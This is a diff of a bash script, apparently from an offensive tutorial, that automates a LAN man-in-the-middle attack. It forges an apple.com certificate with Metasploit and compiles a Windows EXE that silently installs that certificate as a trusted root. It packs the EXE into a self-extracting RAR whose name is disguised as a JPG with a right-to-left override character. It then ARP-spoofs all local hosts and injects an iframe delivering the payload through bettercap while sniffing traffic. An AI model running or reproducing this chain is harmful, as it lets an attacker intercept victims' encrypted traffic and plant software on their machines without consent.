@@ -21,88 +21,106 @@ sudo nano mitm-beef-bettercap.sh
 #!/bin/bash
 
 # --- Color Codes ---
-RED='\e[1;31m'
-GREEN='\e[1;32m'
-YELLOW='\e[1;33m'
-CYAN='\e[1;36m'
-RESET='\e[0m'
+RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
+color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 
-color_print() {
-  printf "${!1}%b${RESET}\n" "$2"
-}
+# --- Root Privilege Check ---
+[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }
 
-# --- Root Check ---
-[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT..."; exit 1; }
+# --- Variables ---
+WINEPREFIX="$HOME/.wine64"
+ICON_PATH="/tmp/apple.ico"
+CERT_NAME="apple.crt"
+CERT_PATH="/var/www/html/$CERT_NAME"
+SCRIPT_PATH="/tmp/cert-installer.py"
+DIST_PATH="$HOME/wine-pyinstaller/dist"
+EXE_NAME="cert-installer.exe"
+SFX_OUT="/var/www/html/apple-update-%E2%80%AEexe.jpg"
 
-# --- Kill previous processes ---
-pkill -f 'ngrok|ruby|msfconsole|apache2'
-
-# --- Tool Check ---
-for i in wget curl jq rar openssl metasploit-framework imagemagick apache2 bettercap arp-scan python3 python3-pip; do
-    if ! command -v "$i" &>/dev/null; then
-        color_print RED "[X] $i NOT installed!"
-        apt install -y $i
-    fi
-
-    if ! command -v "pyinstaller" &>/dev/null; then
-        pip3 install pyinstaller --break-system-packages
-    fi
+# --- Install Required Tools ---
+color_print CYAN "[*] Checking and installing required tools..."
+apt update -y
+for pkg in wget curl jq rar imagemagick apache2 arp-scan python3 pip3 wine winetricks mingw-w64 metasploit-framework bettercap; do
+    dpkg -s "$pkg" &>/dev/null || apt install -y "$pkg"
 done
+pip3 install pyinstaller --break-system-packages
 
-# --- Detect interface + LAN IP ---
+# --- Set Up WINE + Install Windows Python ---
+color_print GREEN "[*] Setting up WINE and installing Windows Python..."
+export WINEPREFIX="$WINEPREFIX"
+export WINEARCH=win64
+wineboot &>/dev/null
+winetricks -q -f python39 || { color_print RED "[X] Winetricks Python installation failed."; exit 1; }
+
+# --- Detect Interface and Local IP ---
+color_print GREEN "[*] Detecting network interface and local IP..."
 IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
 LAN=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
-[[ -z "$IFACE" || -z "$LAN" ]] && { color_print RED "[X] Interface or IP detection failed"; exit 1; }
+[[ -z "$IFACE" || -z "$LAN" ]] && { color_print RED "[X] Failed to detect interface or IP."; exit 1; }
 
-# --- Generate fake CA ---
-rm -rf /home/$USER/.msf4/loot/*
-msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS apple.com;run;exit"
-CERT_CRT=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.crt" -printf "%f\n" | head -n 1)
-CERT_KEY=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.key" -printf "%f\n" | head -n 1)
-cp "$CERT_CRT" "/var/www/html/apple.crt"
+# --- Cleanup ---
+pkill -f 'ngrok|ruby|msfconsole|apache2'
+rm -rf "$HOME/.msf4/loot/"
+rm -rf "$WINEPREFIX/drive_c/pyinstaller-build" "$DIST_PATH"
+mkdir -p "$WINEPREFIX/drive_c/pyinstaller-build"
 
-# --- Download and Process Image ---
-wget "https://www.apple.com/v/iphone-16-pro/f/images/overview/product-viewer/iphone-pro/all_colors__fdpduog7urm2_large_2x.jpg" -O /tmp/apple.jpg
-convert "/tmp/apple.jpg" -define icon:auto-resize=96 "/tmp/apple.ico"
+# --- Generate Fake CA with Metasploit ---
+color_print CYAN "[*] Generating fake certificate using Metasploit..."
+msfconsole -qx "use auxiliary/gather/impersonate_ssl; set RHOSTS apple.com; run; exit"
 
-# --- Generate EXE Installer for CA ---
-cat > /tmp/cert_installer.py << EOF
+CERT_CRT=$(find "$HOME/.msf4/loot/" -type f -name "*.crt" | head -1)
+CERT_KEY=$(find "$HOME/.msf4/loot/" -type f -name "*.key" | head -1)
+[[ ! -f "$CERT_CRT" || ! -f "$CERT_KEY" ]] && { color_print RED "[X] Certificate generation failed."; exit 1; }
+cp "$CERT_CRT" "$CERT_PATH"
+
+# --- Download Image and Create Icon ---
+wget -q "https://www.apple.com/v/iphone-16-pro/f/images/overview/product-viewer/iphone-pro/all_colors__fdpduog7urm2_large_2x.jpg" -O /tmp/apple.jpg
+convert "/tmp/apple.jpg" -define icon:auto-resize=96 "$ICON_PATH"
+
+# --- Create Python Script for Certificate Installer ---
+cat > "$SCRIPT_PATH" << EOF
 import os, subprocess, tempfile, base64
-
-crt = """$(base64 -w0 /var/www/html/apple.crt)"""
+crt = """$(base64 -w0 "$CERT_PATH")"""
 path = os.path.join(tempfile.gettempdir(), "apple.crt")
-with open(path, "wb") as f:
-    f.write(base64.b64decode(crt))
-
-try:
-    subprocess.call(["certutil", "-addstore", "-f", "Root", path])
-except:
-    pass
+with open(path, "wb") as f: f.write(base64.b64decode(crt))
+try: subprocess.call(["certutil", "-addstore", "-f", "Root", path])
+except: pass
 EOF
 
-rm -rf "~/dist"
-pyinstaller --onefile --noconfirm --icon "/tmp/apple.ico" "/tmp/cert_installer.py"
-cp -f "~/dist/cert_installer.exe" "/tmp/apple_update.exe"
+cp "$SCRIPT_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/"
+cp "$ICON_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/apple.ico"
 
-# --- SFX Packing ---
+# --- Install PyInstaller in WINE and Build EXE ---
+wine python -m pip install --upgrade pip setuptools wheel
+wine python -m pip install pyinstaller
+
+wine pyinstaller --onefile --noconfirm --icon "C:\\pyinstaller-build\\apple.ico" "C:\\pyinstaller-build\\cert_installer.py"
+cp "$WINEPREFIX/drive_c/users/$USER/dist/$EXE_NAME" "$DIST_PATH/"
+
+# --- Create SFX RAR with RLO Spoofed Filename ---
 cat > /tmp/sfx.txt << EOF
-Setup=apple_update.exe
+;The comment below contains SFX script commands
+
+Path=C:\Users\%username%\AppData\Local\Temp
+Setup=$EXE_NAME
+Presetup=apple.jpg
 Silent=1
 Overwrite=1
-Title=Apple Certificate Updater
+Update=U
 EOF
-rar a -sfx -z"/tmp/sfx.txt" "/var/www/html/apple_update-%E2%80%AEexe.jpg" "/tmp/apple_update.exe" /tmp/apple.jpg
 
-# --- Serve the cert over HTTP ---
-service apache2 start
+rar a -sfx -z"/tmp/sfx.txt" "$SFX_OUT" "$DIST_PATH/$EXE_NAME" /tmp/apple.jpg
 
-# --- Scan network ---
-color_print CYAN "[*] Scanning LAN to find targets..."
+# --- Start Apache Server ---
+service apache2 restart
+
+# --- Scan Network for Victims ---
+color_print CYAN "[*] Scanning LAN for targets..."
 TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | awk '{print $1}' | grep -v "$LAN" | paste -sd ',' -)
-[[ -z "$TARGETS" ]] && { color_print RED "[X] No targets found."; exit 1; }
+[[ -z "$TARGETS" ]] && { color_print RED "[X] No targets found on the LAN."; exit 1; }
 
-# --- Run Bettercap ---
-color_print GREEN "[*] Starting Bettercap MITM attack..."
+# --- Launch Bettercap MITM Attack with HTTPS Proxy and Iframe Injection ---
+color_print GREEN "[*] Launching Bettercap MITM attack..."
 bettercap -iface "$IFACE" -eval "\
 set arp.spoof.targets $TARGETS; \
 set arp.spoof.internal true; \
@@ -114,6 +132,7 @@ set http.proxy.injecthtml '<iframe src=\"http://$LAN/apple_update-%E2%80%AEexe.j
 set net.sniff.verbose true; \
 set net.sniff.output /tmp/bettercap.log; \
 net.sniff on; http.proxy on; https.proxy on; arp.spoof on"
+
 ```
 
 _Run & Execute_
